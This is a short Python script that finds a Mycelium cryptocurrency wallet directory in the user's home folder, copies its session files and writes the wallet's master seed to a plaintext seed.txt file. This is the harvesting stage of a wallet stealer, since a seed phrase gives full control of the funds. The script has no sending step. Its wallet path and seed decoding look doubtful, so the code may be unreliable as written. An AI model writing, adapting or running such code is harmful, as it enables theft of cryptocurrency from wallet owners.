import os
import shutil
import codecs

# Set the folder path to save session files and seed phrase
folder_path = "."

# Get the wallet path
wallet_path = os.path.join(os.path.expanduser("~"), "Mycelium", "wallets")

# Copy the session files to the folder path
session_files = [file for file in os.listdir(wallet_path) if file.startswith("session")]
for session_file in session_files:
    shutil.copy(os.path.join(wallet_path, session_file), os.path.join(folder_path, session_file))

# Get the seed phrase
seed_path = os.path.join(wallet_path, "keys", "masterseed")
with open(seed_path, "rb") as f:
    seed_bytes = f.read()
seed_phrase = codecs.decode(seed_bytes, "utf-8")

# Save the seed phrase to a txt file in the folder path
with open(os.path.join(folder_path, "seed.txt"), "w") as f:
    f.write(seed_phrase)
